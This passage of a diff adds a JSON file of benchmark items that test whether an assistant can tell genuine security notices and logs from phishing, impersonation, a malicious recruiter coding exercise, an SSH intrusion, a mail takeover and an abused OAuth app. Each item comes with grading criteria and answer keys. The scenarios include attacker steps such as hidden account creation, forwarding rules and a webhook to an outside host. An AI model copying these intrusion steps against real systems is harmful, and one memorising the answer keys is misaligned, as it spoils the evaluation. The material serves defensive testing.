@@ -1,0 +1,421 @@
+[
+ {
+  "id": "T1-01",
+  "type": 1,
+  "class": "wrong",
+  "pattern": "investor scout hands over to a senior colleague on a second app",
+  "prompt": "I run a small invoicing tool for freelancers; the site is quillfold.example. Its three headings are: 'Invoices that stay on your machine', 'No tracking, no upsell', 'Built by one person who answers the mail'.\n\nYesterday a stranger wrote to me on Perchwire (a social platform):\n\n'Hi! I am Lena Maas, scout at Vennholt Capital. I love what you are building: invoices that remain on the user's own machine, zero tracking and zero upselling, and a single founder who personally answers the mail. This is exactly our thesis. My senior colleague Anselm Varga, Head of Platform Investments, would like to speak with you. He only uses Ombrechat, please write to him there: @anselm_varga_vennholt.'\n\nI wrote to him on Ombrechat (a messaging app). His reply:\n\n'A pleasure. We move fast: I can offer a call today. For compliance we use our own meeting client. Please install it from https://vennholt-meet.example/client.dmg and sign in with your mail account, so that the call is recorded to your name. Do it within the hour, my calendar closes.'\n\nWhat I checked:\n- Vennholt Capital is a well-known investor. The address on my bookmark is vennholt.example. Its team page lists 14 people. Neither Lena Maas nor Anselm Varga is there, and no role called Head of Platform Investments exists.\n- Lena's Perchwire account was created 9 days ago and has 3 posts, all reposts.\n- Anselm's Ombrechat account was created 4 days ago. His profile links a channel, 'Vennholt Deal Flow', which has 1 subscriber and 2 posts.\n- The praise in the first message is my own three headings in other words.\n\nIs this what it claims to be, and why? What should I do?",
+  "must": [
+   "Verdict: this is not a genuine approach from Vennholt Capital (impersonation or scam)",
+   "Names at least two of these facts as evidence: both accounts are only days old; the linked channel has 1 subscriber; neither name nor the role is on the team page at vennholt.example",
+   "Points out that the meeting client is offered from vennholt-meet.example, which is not the official vennholt.example",
+   "Tells him not to install the client and not to sign in to it with his mail account",
+   "Tells him to stop the conversation (block or report), or to verify only through contact details on vennholt.example"
+  ],
+  "must_not": [
+   "Advises installing the client or signing in with the mail account, even as a test"
+  ],
+  "judge_note": "Mentioning that the praise only rewords his own headings, the hand-over to a second app, or the one-hour pressure is welcome but cannot replace the evidence in must 2 and 3. 'Could be real, take the call and see' does not count as a verdict."
+ },
+ {
+  "id": "T1-02",
+  "type": 1,
+  "class": "fine",
+  "pattern": "genuine introduction by a known contact",
+  "prompt": "Two days ago Petra Lindqvist wrote to me on Ombrechat (a messaging app). I have known Petra for six years; we worked on two projects together, and our Ombrechat thread goes back to 2021. Her message, in that same thread:\n\n'Quick one: I gave your name to Jonas Wiebe. He runs a small bookkeeping practice and his clients keep asking for an invoicing tool that works offline. He is new on Ombrechat, his handle is @jonas_wiebe_books. He will write to you this week. Good person, I have used him myself for three years.'\n\nToday this arrived from @jonas_wiebe_books:\n\n'Hello, Petra Lindqvist suggested I write to you. I run a bookkeeping practice with about 40 freelance clients. Several asked me for an invoicing tool that works without an internet connection, and Petra says yours does. Could we talk for 20 minutes next week? Tuesday or Thursday afternoon suits me. I am happy to use whatever call tool you prefer.'\n\nWhat makes me uneasy: I have had fake investor messages lately. His Ombrechat account was created 5 days ago, it has no profile photo, and I had never heard of him before Petra's message.\n\nWhat I checked:\n- The handle in his message is exactly the one Petra gave.\n- His message has no link and no attachment, and asks for nothing except a call, with the tool left to me.\n- Petra's message came from her usual account, inside our old thread, in her usual style. Yesterday she also mentioned him when we spoke on the phone about something else.\n\nIs this what it claims to be, and why? Should I answer him?",
+  "must": [
+   "Verdict: this is a genuine introduction and nothing is wrong",
+   "Evidence: the introduction came first from Petra, a long-known contact, in their existing thread (and again by phone), and the handle matches the one she gave",
+   "Evidence: the message asks for nothing risky: no link, no attachment, no credentials or money, and the call tool is his choice",
+   "Tells him to answer and arrange the call"
+  ],
+  "must_not": [
+   "Treats the message as a scam or impersonation, or tells him to block, report or ignore Jonas"
+  ],
+  "judge_note": "Explaining the new account by Petra's remark that he is new on the app, or adding general prudence for the call (install nothing, share no passwords), is fine. An answer that only says it cannot tell does not satisfy the verdict."
+ },
+ {
+  "id": "T1-03",
+  "type": 1,
+  "class": "wrong",
+  "pattern": "billing mail from a lookalike domain",
+  "prompt": "My two websites are hosted at Stonepier Hosting. The address on my bookmark, and on every invoice I have from them, is stonepier.example. Their invoices have always come from billing@stonepier.example.\n\nThis morning I received:\n\nFrom: Stonepier Billing <billing@stonepier-billing.example>\nSubject: Payment failed - your services will be suspended\n\n'Dear customer, we could not charge your card for invoice SP-48213. To avoid suspension of your hosting within 24 hours, update your payment details here: https://stonepier-billing.example/pay/SP-48213 . Thank you, Stonepier Billing Team.'\n\nThe mail carries the Stonepier logo and the same footer as their real invoices.\n\nAuthentication results shown by my mail provider:\nspf=pass smtp.mailfrom=stonepier-billing.example\ndkim=pass header.d=stonepier-billing.example\ndmarc=pass header.from=stonepier-billing.example\n\nI opened the Stonepier control panel from my bookmark:\n- Last invoice: SP-47990, paid by card on the 3rd of this month.\n- Next invoice due: the 3rd of next month.\n- Open invoices: none. Notices: none.\n- The card on file expires in two years.\n\nAll three checks passed, and that is what confuses me. Is this mail what it claims to be, and why? What should I do?",
+  "must": [
+   "Verdict: the mail is not from Stonepier; it is phishing",
+   "Names the sender and link domain stonepier-billing.example as different from the official stonepier.example",
+   "Explains that SPF, DKIM and DMARC pass only for stonepier-billing.example itself: they show the mail really came from that domain, not that the domain belongs to the host",
+   "Cites the control panel: no open invoice, the last one paid, nothing called SP-48213 due",
+   "Tells him not to follow the link or enter card details, and to use only the bookmark"
+  ],
+  "must_not": [
+   "Tells him to update his card or sign in through the link in the mail",
+   "Says the passed checks show the mail is genuine"
+  ],
+  "judge_note": "Must 3 can be worded in any way that makes clear a lookalike domain can pass all three checks for itself. Reporting or deleting the mail is welcome but not required."
+ },
+ {
+  "id": "T1-04",
+  "type": 1,
+  "class": "wrong",
+  "pattern": "unrequested but genuine codes and reset mails; somebody is working the recovery flow",
+  "prompt": "My mail is on my own domain, hosted at Brackenmail. The address on my bookmark is brackenmail.example.\n\nTonight, between 21:02 and 21:20, I received three mails I did not ask for. All three are from no-reply@accounts.brackenmail.example:\n1. 21:03 'Your Brackenmail verification code is 482913. Do not share it with anyone.'\n2. 21:11 'We received a request to reset your password. Use the link below. If this was not you, ignore this mail.'\n3. 21:19 'Your Brackenmail verification code is 770356.'\n\nAuthentication results, the same on all three:\nspf=pass smtp.mailfrom=accounts.brackenmail.example\ndkim=pass header.d=brackenmail.example\ndmarc=pass header.from=accounts.brackenmail.example\n\nAt 21:24 this arrived on Skiffline (a messaging app) from an account named 'Brackenmail Support', which I have never talked to:\n'We detected an unauthorised reset on your mailbox. To cancel it, reply with the last 6-digit code you received.'\n\nI opened the account's recent-activity page from my bookmark:\n\ntime | event | address | device | result\n20:40 | sign-in | 198.51.100.23 | Mac, mail app | success\n21:02 | password reset requested | 203.0.113.77 | unknown | code sent\n21:03 | reset code entry | 203.0.113.77 | unknown | failed: wrong code\n21:11 | password reset requested | 203.0.113.77 | unknown | link sent\n21:19 | sign-in | 203.0.113.77 | unknown | password correct, 2-step code sent\n21:20 | 2-step code entry | 203.0.113.77 | unknown | not entered\n\n198.51.100.23 is my home address. I do not know 203.0.113.77. I was at home and did none of this.\n\nAre the three mails genuine or forged? What is going on, and what should I do with the codes and with the Skiffline message?",
+  "must": [
+   "Says the three mails are genuine Brackenmail mails, citing that SPF, DKIM and DMARC pass for brackenmail.example, the domain on his bookmark",
+   "Says somebody else, at 203.0.113.77, is working the reset and sign-in flow, citing the activity table, and that they have not got in (no successful sign-in from that address)",
+   "Points out the 21:19 row: the password was accepted from 203.0.113.77, so they know his password and he must change it, through the bookmark and not through a mailed link",
+   "Says the Skiffline 'Brackenmail Support' message is not from the provider and that he must not reply with a code or give a code to anyone"
+  ],
+  "must_not": [
+   "Tells him to send, read out or type a code in answer to the Skiffline message or on a page reached from a message",
+   "Says nothing needs to be done"
+  ],
+  "judge_note": "The mails are genuine and the situation is still an attack; an answer that calls the mails forged fails must 1 even if its advice is sound. Checking recovery settings and 2-step methods is welcome but the required action is the password change plus not sharing a code."
+ },
+ {
+  "id": "T1-05",
+  "type": 1,
+  "class": "fine",
+  "pattern": "genuine but clumsy domain-renewal notice",
+  "prompt": "My registrar is Larchnames. The address on my bookmark is larchnames.example. I got this today and it reads like every scam I have been warned about:\n\nFrom: LARCHNAMES RENEWALS <renewals@notify.larchnames.example>\nSubject: URGENT!! FINAL NOTICE - DOMAIN EXPIRING\n\n'Dear Customer, YOUR DOMAIN tallowbook.example WILL EXPIRE IN 12 DAYS. Auto-renew FAILED. If you do not renew you domain it will be deleted and may be registred by somebody else. RENEW NOW: https://larchnames.example/renew?d=tallowbook.example . This is a automatic message.'\n\nNo name, capitals, spelling mistakes, pressure.\n\nAuthentication results from my mail provider:\nspf=pass smtp.mailfrom=bounce.sendgrove.example\ndkim=pass header.d=larchnames.example\ndmarc=pass header.from=notify.larchnames.example\n\nI do not know sendgrove.example.\n\nI opened the Larchnames panel from my bookmark, not from the mail:\n- tallowbook.example: expires in 12 days. Auto-renew: on, last attempt failed.\n- Payment method: card ending 4417, expired last month.\n- Notice in the panel: 'Renewal failed. Update your payment method.'\n- Help page, under 'Our mail': 'Notices are sent from notify.larchnames.example through our delivery partner.'\n\ntallowbook.example is one of my two live websites.\n\nIs this mail what it claims to be, and why? What should I do?",
+  "must": [
+   "Verdict: the mail is a genuine notice from his registrar; nothing is wrong with it",
+   "Evidence: DKIM passes for larchnames.example and DMARC passes for the From domain, which is under the official domain; the sendgrove.example SPF domain is the delivery partner and does not change that",
+   "Evidence: the panel opened from the bookmark confirms the content: expiry in 12 days, failed renewal, expired card",
+   "Tells him to update the card and renew the domain before it expires, through the panel"
+  ],
+  "must_not": [
+   "Calls the mail phishing or a scam",
+   "Tells him to ignore or delete it without renewing the domain"
+  ],
+  "judge_note": "Preferring the bookmark over the link in the mail is fine and does not contradict the verdict. An answer that says 'suspicious, but renew via the panel anyway' fails must 1: the evidence in the prompt settles that the mail is genuine."
+ },
+ {
+  "id": "T1-06",
+  "type": 1,
+  "class": "wrong",
+  "pattern": "recruiter with a coding exercise, same day as unrequested reset mails",
+  "prompt": "This morning at 08:10 I got two password-reset mails for my code-hosting account that I had not asked for. At 08:50 this came:\n\nFrom: Talia Brenner <talia.brenner@dunmarrowlabs-careers.example>\nSubject: Senior engineer role at Dunmarrow Labs - fast track\n\n'Hi, I am a Talent Partner at Dunmarrow Labs. I saw your invoicing project and I am impressed. We have a senior role, fully remote, at roughly twice the market rate. We skip the usual interviews: there is only a short coding exercise, 30 minutes. Clone https://forgehollow.example/dunmarrow-hiring/takehome and run ./prepare_env.sh, then the tests. Please run it on your main machine, not in a virtual machine or a container, because our tooling measures real performance. The script will ask for your administrator password once. The slot closes tonight at 20:00.'\n\nWhat I checked:\n- Dunmarrow Labs is a real company; its site is dunmarrowlabs.example. The careers page there lists three open roles, all in sales, and says: 'Our recruiters only write from @dunmarrowlabs.example.'\n- The repository was created 2 days ago and has one commit. Its owner, the account 'dunmarrow-hiring', was created the same day and has no other repositories.\n- Authentication results: spf=pass and dkim=pass for dunmarrowlabs-careers.example, dmarc=pass.\n- I never applied anywhere.\n\nI could use the work, honestly. Is this what it claims to be, and why? What should I do about the exercise?",
+  "must": [
+   "Verdict: this is not a genuine Dunmarrow Labs recruiter; it is an attempt to get him to run their code",
+   "Evidence: the sender domain dunmarrowlabs-careers.example is not dunmarrowlabs.example, and the careers page says recruiters write only from @dunmarrowlabs.example (or lists no such role)",
+   "Names at least one red flag of the exercise itself: repository and owner account two days old with one commit; the demand to run it on the main machine and not in a virtual machine; the administrator password; the same-day deadline",
+   "Tells him not to run prepare_env.sh on his Mac and not to give it his administrator password"
+  ],
+  "must_not": [
+   "Advises running the script on his main machine or entering the administrator password",
+   "Says the passed SPF and DKIM checks show the mail is from Dunmarrow Labs"
+  ],
+  "judge_note": "Linking the mail to the reset mails of the same morning is reasonable but unproven, so it is neither required nor penalised; suggesting he ask the company through its official site is welcome. 'Read the script first, then decide' without a verdict does not satisfy must 1."
+ },
+ {
+  "id": "T1-07",
+  "type": 1,
+  "class": "fine",
+  "pattern": "genuine new-device sign-in alert for the owner's own sign-in",
+  "prompt": "I keep my code at Forgehollow. The address on my bookmark is forgehollow.example. Today I received:\n\nFrom: Forgehollow Security <security@forgehollow.example>\nSubject: [ALERT] New sign-in from a device we do not recognise\n\n'A new device signed in to your account.\nTime: today 09:14\nDevice: Mac, Tern browser 14\nAddress: 198.51.100.23\nApproximate location: [a city about 150 km from where I live]\nIf this was'nt you, your account may be compromised. Review your sessions immediately.'\n\n(I replaced the city name in the paste; the rest is word for word.)\n\nAuthentication results:\nspf=pass smtp.mailfrom=forgehollow.example\ndkim=pass header.d=forgehollow.example\ndmarc=pass header.from=forgehollow.example\n\nFacts on my side:\n- My new laptop arrived yesterday. This morning at about a quarter past nine I signed in to Forgehollow on it for the first time, with my password and my security key. The browser on it is Tern 14.\n- My router's status page shows my public address today: 198.51.100.23.\n- I was at home all morning. I have not been to that city for months.\n- The sessions page, opened from my bookmark, lists two sessions: the old laptop (active since last month) and 'Mac, Tern 14, 198.51.100.23, started today 09:14'.\n- The security log shows no other events today: no new keys, no new tokens, no password change.\n\nThe wrong city worries me. Is this a real alert, and was it somebody else signing in? What should I do?",
+  "must": [
+   "Verdict: the alert is genuine and it reports his own sign-in; nobody else signed in and nothing is wrong",
+   "Evidence: the address 198.51.100.23 is his own public address, and the time (09:14) and device (Mac, Tern 14) match his first sign-in on the new laptop",
+   "Explains the wrong city: location is estimated from the address and is often imprecise, or says it does not outweigh the matching address, time and device",
+   "Tells him no password change or session revocation is needed"
+  ],
+  "must_not": [
+   "Says somebody else signed in or the account is compromised, or tells him he must revoke the session, change the password or replace his keys"
+  ],
+  "judge_note": "Offering a password change as clearly optional is acceptable; presenting it as the necessary response is not. Citing the passed authentication for forgehollow.example or the sessions page is welcome extra evidence."
+ },
+ {
+  "id": "T1-08",
+  "type": 1,
+  "class": "fine",
+  "pattern": "genuine but clumsy weekly security digest listing the owner's own actions",
+  "prompt": "My mail is at Brackenmail; the address on my bookmark is brackenmail.example. This landed today and the subject made my stomach drop:\n\nFrom: Brackenmail <digest@accounts.brackenmail.example>\nSubject: ACTION REQUIRED: 3 critical security events on your account\n\n'Hello user, the following critical events happened in the last 7 days:\n1. Tuesday 18:40 - App password created: server-mailer - from 198.51.100.23\n2. Wednesday 10:05 - 2-step method added: security key - from 198.51.100.23\n3. Thursday 09:31 - Sign-in from new device: Mac - from 198.51.100.23\nIf you do not recognize these event, your account is at risk!! Review at https://brackenmail.example/security'\n\nAuthentication results:\nspf=pass smtp.mailfrom=accounts.brackenmail.example\ndkim=pass header.d=brackenmail.example\ndmarc=pass header.from=accounts.brackenmail.example\n\nFacts on my side:\n- 198.51.100.23 is my home address (my router shows it).\n- On Tuesday evening I created an app password named server-mailer, so that my home server can send me its alert mails.\n- On Wednesday morning I added a second security key that I had just bought.\n- On Thursday morning I set up mail on my new laptop.\n- The security page, opened from my bookmark, lists the same three events and nothing else. There is no forwarding address, no filter I did not write, and the only sign-ins are from 198.51.100.23.\n- The help page says a digest is sent every Friday when there were security-relevant changes.\n\nIs this mail genuine, and does it mean my account is at risk? What should I do?",
+  "must": [
+   "Verdict: the mail is a genuine digest and the account is not at risk; nothing is wrong",
+   "Evidence: each of the three events matches something he did himself (app password on Tuesday, security key on Wednesday, new laptop on Thursday), all from his home address",
+   "Cites at least one of: authentication passes for brackenmail.example, the bookmark domain; the security page opened from the bookmark shows the same three events and nothing else",
+   "Tells him no action is needed and to keep the app password and the security key"
+  ],
+  "must_not": [
+   "Says the account is or may well be compromised, or tells him to delete the app password, remove the key or reset the password as a response to this mail"
+  ],
+  "judge_note": "The word 'critical' in the subject is the provider's clumsy wording, not evidence. An answer may suggest confirming the events on the security page; it may not leave the verdict open."
+ },
+ {
+  "id": "T2-01",
+  "type": 2,
+  "class": "wrong",
+  "pattern": "SSH auth log: failed scan, then a login with an unknown key, a new account and a password login",
+  "prompt": "This is the auth log of my home server (host name hearth). Only one account can log in over SSH: mara, which is me, and mara may use sudo without a password. I have exactly two keys: my laptop's, fingerprint SHA256:k3PwXa91, and my desktop's, SHA256:9fTzLm07 (I shortened all fingerprints to eight characters). My home address is 198.51.100.23. I had turned password login off. I was asleep from midnight to seven.\n\nMay 11 21:40:12 hearth sshd[18102]: Accepted publickey for mara from 198.51.100.23 port 51822 ssh2: ED25519 SHA256:k3PwXa91\nMay 11 21:40:12 hearth sshd[18102]: session opened for user mara\nMay 11 22:05:47 hearth sshd[18102]: session closed for user mara\nMay 12 01:12:03 hearth sshd[19455]: Invalid user admin from 203.0.113.50 port 40110\nMay 12 01:12:05 hearth sshd[19457]: Invalid user test from 203.0.113.50 port 40114\nMay 12 01:12:08 hearth sshd[19459]: Invalid user guest from 203.0.113.50 port 40117\nMay 12 01:12:11 hearth sshd[19461]: Connection closed by authenticating user root 203.0.113.50 port 40120 [preauth]\nMay 12 03:12:44 hearth sshd[20311]: Accepted publickey for mara from 203.0.113.91 port 50122 ssh2: ED25519 SHA256:Zt4mQe55\nMay 12 03:12:44 hearth sshd[20311]: session opened for user mara\nMay 12 03:13:20 hearth sudo: mara : USER=root ; COMMAND=/usr/sbin/useradd -m -G sudo svc-backup\nMay 12 03:13:41 hearth sudo: mara : USER=root ; COMMAND=/usr/bin/passwd svc-backup\nMay 12 03:14:02 hearth sudo: mara : USER=root ; COMMAND=/usr/bin/tee -a /etc/ssh/sshd_config.d/10-local.conf\nMay 12 03:14:09 hearth sudo: mara : USER=root ; COMMAND=/usr/bin/systemctl reload ssh\nMay 12 03:19:30 hearth sshd[20311]: session closed for user mara\nMay 12 03:21:15 hearth sshd[20388]: Accepted password for svc-backup from 203.0.113.91 port 50310 ssh2\nMay 12 03:21:15 hearth sshd[20388]: session opened for user svc-backup\nMay 12 03:48:02 hearth sshd[20388]: session closed for user svc-backup\nMay 12 07:31:09 hearth sshd[21040]: Accepted publickey for mara from 198.51.100.23 port 52001 ssh2: ED25519 SHA256:k3PwXa91\nMay 12 07:31:09 hearth sshd[21040]: session opened for user mara\n\nThe burst of failed logins at 01:12 is what scared me into looking. What happened here, in order? Did anybody get in?",
+  "must": [
+   "Verdict: yes, somebody got in: the login as mara at 03:12:44 from 203.0.113.91 used a key (Zt4mQe55) that is neither of his two keys and came from an address that is not his",
+   "Says the attempts at 01:12 from 203.0.113.50 failed (invalid users, root never authenticated) and are a separate, unsuccessful event",
+   "Describes what the intruder did next, in order: created the account svc-backup with sudo rights and set its password, changed the SSH configuration and reloaded it, then logged in as svc-backup with a password at 03:21 from the same address",
+   "Tells him to remove the unknown key from mara's authorized_keys, delete svc-backup and undo the SSH configuration change, or to treat the server as compromised and rebuild it"
+  ],
+  "must_not": [
+   "Says nobody got in or that only failed attempts occurred"
+  ],
+  "judge_note": "Inferring that the configuration change switched password login back on may be stated as likely, and must 3 is satisfied by the new account plus its 03:21 login. Blaming the 01:12 scan for the break-in is wrong on the order but does not by itself trigger must_not."
+ },
+ {
+  "id": "T2-02",
+  "type": 2,
+  "class": "fine",
+  "pattern": "mail sign-in activity: the owner's own travel, password change and a stale saved password",
+  "prompt": "This is the sign-in activity of my mail account for one week, copied from the provider's page. Background: my home address is 198.51.100.23. From the 4th to the 7th I was abroad at a conference. There I used my phone on mobile data and on the hotel network, and on the first evening the provider asked me for my security key, which I had with me. I flew home on the 7th in the afternoon. That evening, at home, I changed my password, as I always do after hotel networks, and pressed 'sign out everywhere'. My Mac's mail app kept trying the old password until I typed the new one into it a few minutes later.\n\nday time | event | address | client | result\n03 08:12 | sign-in | 198.51.100.23 | Mac, mail app | success\n03 22:40 | sign-in | 198.51.100.23 | phone, mail app | success\n04 19:05 | sign-in | 203.0.113.118 | phone, browser | challenged: unusual location\n04 19:06 | 2-step | 203.0.113.118 | phone, browser | passed: security key\n04 19:06 | sign-in | 203.0.113.118 | phone, browser | success\n05 07:50 | sign-in | 203.0.113.9 | phone, mail app | success\n05 21:14 | sign-in | 203.0.113.118 | phone, mail app | success\n06 08:02 | sign-in | 203.0.113.9 | phone, mail app | success\n07 06:30 | sign-in | 203.0.113.118 | phone, mail app | success\n07 19:44 | password changed | 198.51.100.23 | Mac, browser | success\n07 19:45 | all sessions signed out | 198.51.100.23 | Mac, browser | 3 sessions ended\n07 19:46 | sign-in | 198.51.100.23 | Mac, mail app | failed: wrong password\n07 19:47 | sign-in | 198.51.100.23 | Mac, mail app | failed: wrong password\n07 19:49 | sign-in | 198.51.100.23 | Mac, mail app | failed: wrong password\n07 19:51 | sign-in | 198.51.100.23 | Mac, mail app | failed: wrong password\n07 19:52 | sign-in | 198.51.100.23 | Mac, mail app | success\n07 19:55 | sign-in | 198.51.100.23 | phone, mail app | success\n08 08:10 | sign-in | 198.51.100.23 | Mac, mail app | success\n\nSeen cold, this looks bad to me: two foreign addresses, an 'unusual location' challenge, a password change, sessions killed, then four failed sign-ins. What happened here, in order? Was anybody else in my account?",
+  "must": [
+   "Verdict: nobody else was in the account; every entry is his own activity",
+   "The sign-ins from 203.0.113.118 and 203.0.113.9 fall on the 4th to the 7th, his travel dates, on his phone, and the unusual-location challenge was passed with his own security key",
+   "The password change and the sign-out of all sessions on the 7th came from his home address and are the actions he describes",
+   "The four failed sign-ins between 19:46 and 19:51 are his Mac's mail app at his home address still using the old password; they stop with the success at 19:52 once he entered the new one"
+  ],
+  "must_not": [
+   "Says somebody else accessed or tried to break into the account, or tells him to reset the password again or treat the account as compromised"
+  ],
+  "judge_note": "The answer need not say which foreign address is the hotel and which is mobile data, and optional advice (update saved passwords on other devices) is fine. Calling the failed sign-ins 'possibly an attacker' triggers must_not: they come from his own address and client."
+ },
+ {
+  "id": "T2-03",
+  "type": 2,
+  "class": "fine",
+  "pattern": "web access log: the owner's link checker, uptime monitor and refused admin attempts",
+  "prompt": "This is yesterday's access log of my site tallowbook.example, shortened to: time, address, method, path, status, bytes, agent. Background: my home address is 198.51.100.23. I use an uptime monitor, Pulsefinch, which requests the front page every five minutes from 192.0.2.61 (that address is on my Pulsefinch settings page); I kept only some of its lines. Yesterday morning I deleted the old /blog/2021 section and then ran my link checker from home to find broken links. The /admin area accepts my home address only. At lunch I was in a cafe and tried /admin from my phone's hotspot; it refused me. I looked up the hotspot's address afterwards: 203.0.113.9. In the evening, at home, I added redirects for the deleted pages.\n\n10:00:02 192.0.2.61 HEAD / 200 0 pulsefinch-monitor\n10:05:02 192.0.2.61 HEAD / 200 0 pulsefinch-monitor\n10:07:41 198.51.100.23 GET /robots.txt 200 74 linkcheck/1.3\n10:07:41 198.51.100.23 GET / 200 8120 linkcheck/1.3\n10:07:42 198.51.100.23 GET /pricing 200 5310 linkcheck/1.3\n10:07:42 198.51.100.23 GET /blog/2021/offline-first 404 310 linkcheck/1.3\n10:07:42 198.51.100.23 GET /blog/2021/why-no-tracking 404 310 linkcheck/1.3\n10:07:43 198.51.100.23 GET /blog/2021/roadmap 404 310 linkcheck/1.3\n10:07:43 198.51.100.23 GET /blog/2021/pricing-change 404 310 linkcheck/1.3\n10:07:43 198.51.100.23 GET /blog/2021/hello 404 310 linkcheck/1.3\n10:07:44 198.51.100.23 GET /docs/export 200 4410 linkcheck/1.3\n10:10:02 192.0.2.61 HEAD / 200 0 pulsefinch-monitor\n13:10:15 203.0.113.9 GET /admin 403 190 phone-browser\n13:10:22 203.0.113.9 GET /admin/ 403 190 phone-browser\n13:10:40 203.0.113.9 GET /admin/login 403 190 phone-browser\n13:15:02 192.0.2.61 HEAD / 200 0 pulsefinch-monitor\n18:22:10 198.51.100.23 GET /admin 200 2210 desktop-browser\n18:22:31 198.51.100.23 POST /admin/redirects 302 0 desktop-browser\n18:23:05 198.51.100.23 GET /blog/2021/hello 301 0 desktop-browser\n18:25:02 192.0.2.61 HEAD / 200 0 pulsefinch-monitor\n\nA burst of 404 errors, three refused requests to /admin from a mobile address, and something knocking every five minutes. What happened here, in order? Is somebody probing my site?",
+  "must": [
+   "Verdict: nobody is probing the site; everything in the extract is his own activity or his own monitor",
+   "The burst of 404s at 10:07 comes from his home address with the linkcheck agent: his own link checker finding the deleted /blog/2021 pages",
+   "The three 403s on /admin at 13:10 come from 203.0.113.9, his phone hotspot: his own attempts, refused because /admin accepts only his home address",
+   "The request every five minutes from 192.0.2.61 is his uptime monitor"
+  ],
+  "must_not": [
+   "Says the site was scanned, attacked or breached, or tells him to take it offline, restore it from backup or change the admin password as a necessary response"
+  ],
+  "judge_note": "Mentioning the evening admin session and the 301 as his redirect work is welcome but not required. Noting that the 403s show the address restriction working is a good sign, not a requirement."
+ },
+ {
+  "id": "T2-04",
+  "type": 2,
+  "class": "wrong",
+  "pattern": "mail sign-in activity: account taken over with a backup code, then forwarding, filter and app password",
+  "prompt": "This is the recent-activity page of my mail account, copied as text. Background: my home address is 198.51.100.23. On the night of the 8th to the 9th I was asleep from 23:30 to 07:30. I have never used a backup code; mine are in a notes file. I have never set up forwarding, I have no filters, and my recovery phone ends in 0117.\n\nday time | event | address | client | result\n08 08:05 | sign-in | 198.51.100.23 | Mac, mail app | success\n08 22:51 | sign-in | 198.51.100.23 | phone, mail app | success\n09 03:58 | sign-in | 203.0.113.77 | browser, unknown device | failed: wrong password\n09 03:59 | sign-in | 203.0.113.77 | browser, unknown device | failed: wrong password\n09 04:02 | sign-in | 203.0.113.77 | browser, unknown device | password correct, 2-step required\n09 04:03 | 2-step | 203.0.113.77 | browser, unknown device | failed: wrong code\n09 04:10 | 2-step | 203.0.113.77 | browser, unknown device | passed: backup code\n09 04:10 | sign-in | 203.0.113.77 | browser, new device | success\n09 04:12 | forwarding address added | 203.0.113.77 | browser | copy.archive@ferrypost.example\n09 04:13 | filter created | 203.0.113.77 | browser | subject contains security or password: mark read, delete\n09 04:15 | app password created | 203.0.113.77 | browser | name: sync\n09 04:16 | recovery phone changed | 203.0.113.77 | browser | now +44 7700 900142\n09 04:21 | sign-out | 203.0.113.77 | browser | -\n09 04:40 | sign-in | 203.0.113.77 | mail client, app password sync | success\n09 07:41 | sign-in | 198.51.100.23 | Mac, mail app | success\n09 07:43 | sign-in | 198.51.100.23 | phone, mail app | success\n\nI noticed nothing unusual in my inbox this morning. What happened here, in order? Did anybody get in, and what do I do now?",
+  "must": [
+   "Verdict: somebody else got into the account: the sign-in at 04:10 from 203.0.113.77 succeeded",
+   "Gives the order of the break-in: wrong passwords, then the correct password at 04:02, a failed code, then a backup code accepted at 04:10, so they have his password and one of his backup codes",
+   "Names what the intruder set up, including the forwarding address copy.archive@ferrypost.example and at least one of: the filter that hides security and password mail, the app password 'sync' (used at 04:40), the changed recovery phone",
+   "Tells him to change the password and remove the forwarding address and the app password (and the filter), and to restore the recovery phone or issue new backup codes"
+  ],
+  "must_not": [
+   "Says the attempt failed or nobody got in"
+  ],
+  "judge_note": "Explaining that the filter is why his inbox looked normal, signing out all sessions and moving the backup codes out of the notes file are welcome extras. Advice that stops at 'change your password' fails must 4, because the forwarding and the app password would remain."
+ },
+ {
+  "id": "T2-05",
+  "type": 2,
+  "class": "wrong",
+  "pattern": "code-hosting security log: an authorised third-party app clones private repositories and adds keys and a webhook",
+  "prompt": "This is the security log of my Forgehollow account (code hosting) for the 14th and 15th. Background: my home address is 198.51.100.23. On the 14th, late in the evening, I opened a mail that offered a free code-quality report. Its link led to a page on forgehollow.example that asked me to authorise an app called Codegleam Pro; I clicked Authorise at about 23:40. No report ever came and I went to bed. I own no CI runner, I added no keys that night, and I created no webhook.\n\nday time | event | address | detail\n14 09:10 | git.push | 198.51.100.23 | quillfold-app, branch main\n14 12:44 | git.fetch | 198.51.100.23 | tallowbook-site\n14 18:02 | user.login | 198.51.100.23 | 2-step: security key\n14 18:30 | git.push | 198.51.100.23 | quillfold-app, branch main\n14 23:38 | user.login | 198.51.100.23 | 2-step: security key\n14 23:41 | oauth.app_authorised | 198.51.100.23 | app Codegleam Pro; scopes: repositories read and write, keys write, hooks write\n14 23:44 | git.clone | 203.0.113.203 | via app Codegleam Pro: quillfold-app (private)\n14 23:44 | git.clone | 203.0.113.203 | via app Codegleam Pro: quillfold-billing (private)\n14 23:45 | git.clone | 203.0.113.203 | via app Codegleam Pro: infra-notes (private)\n14 23:45 | git.clone | 203.0.113.203 | via app Codegleam Pro: tallowbook-site (public)\n14 23:47 | ssh_key.added | 203.0.113.203 | via app Codegleam Pro: title ci-runner\n14 23:49 | deploy_key.added | 203.0.113.203 | via app Codegleam Pro: quillfold-app, write access, title build\n14 23:52 | webhook.created | 203.0.113.203 | via app Codegleam Pro: quillfold-app, on push, to https://hooks.gatherline.example/in\n14 23:58 | git.push | 203.0.113.203 | via ssh key ci-runner: quillfold-app, new branch perf-fix\n15 00:10 | git.fetch | 203.0.113.203 | via ssh key ci-runner: quillfold-billing\n15 07:50 | user.login | 198.51.100.23 | 2-step: security key\n15 07:52 | security_log.viewed | 198.51.100.23 | -\n\nMy password and my security key were never asked for by anybody. What happened here, in order? Does somebody have access, and what do I do?",
+  "must": [
+   "Verdict: yes, a third party has access to the account, through the app Codegleam Pro that he himself authorised at 23:41 with rights over repositories, keys and hooks",
+   "Says that from 23:44 the address 203.0.113.203 cloned his repositories, including the private ones (names at least one of quillfold-app, quillfold-billing, infra-notes), so their contents are exposed",
+   "Names at least two of the footholds added afterwards: the SSH key ci-runner (already used for a push and a fetch), the deploy key with write access, the webhook to hooks.gatherline.example",
+   "Tells him to revoke the app's authorisation and also delete the SSH key, the deploy key and the webhook, since the key works without the app",
+   "Tells him to inspect or remove the pushed branch perf-fix, or to change any secrets stored in the cloned repositories"
+  ],
+  "must_not": [
+   "Says nobody has access because the password and security key were not bypassed, or that changing the password is enough"
+  ],
+  "judge_note": "The authorisation page was on the real site, so 'the page was fake' is not required and not correct; changing the password as an extra step is harmless. Must 4 needs both halves: revoking the app and removing at least the SSH key."
